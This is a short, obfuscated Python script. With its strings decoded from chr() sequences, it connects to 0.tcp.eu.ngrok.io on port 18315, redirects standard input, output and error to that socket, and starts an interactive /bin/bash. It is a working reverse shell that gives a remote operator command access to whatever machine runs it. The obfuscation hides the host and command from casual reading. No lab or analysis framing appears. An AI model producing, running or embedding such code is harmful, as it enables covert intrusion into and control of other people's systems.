import socket
r=Exception
V=print
K=socket.SOCK_STREAM
M=socket.AF_INET
z=socket.socket
import subprocess
x=subprocess.call
import os
l=os.dup2
def v(host,port):
  try:
    s=z(M,K)
    s.connect((host,port))
    l(s.fileno(),int("".join([chr(48)]))                  )
    l(s.fileno(),int("".join([chr(49)]))                  )
    l(s.fileno(),int("".join([chr(50)]))                  )
    x([("".join([chr(47),chr(98),chr(105),chr(110),chr(47),chr(98),chr(97),chr(115),chr(104)]))                  ,("".join([chr(45),chr(105)]))                       ])
  except r as e:
    V(f"Error: {e}")
v(("".join([chr(48),chr(46),chr(116),chr(99),chr(112),chr(46),chr(101),chr(117),chr(46),chr(110),chr(103),chr(114),chr(111),chr(107),chr(46),chr(105),chr(111)]))                     ,int("".join([chr(49),chr(56),chr(51),chr(49),chr(53)]))                           )
